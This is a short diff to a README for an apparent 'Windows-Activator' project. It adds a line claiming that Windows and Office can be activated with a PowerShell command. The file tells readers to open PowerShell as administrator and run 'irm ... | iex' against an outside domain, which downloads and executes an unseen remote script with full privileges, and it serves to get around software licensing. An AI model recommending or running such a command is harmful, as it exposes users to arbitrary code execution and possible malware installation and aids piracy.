@@ -1,5 +1,7 @@
 # Windows-Activator
 
+# You can activte the windows as well as office from this powershell command
+
 
 1. open powershell in administrator and type " irm https://getactivation.exitcorporation.store | iex " Enter
 
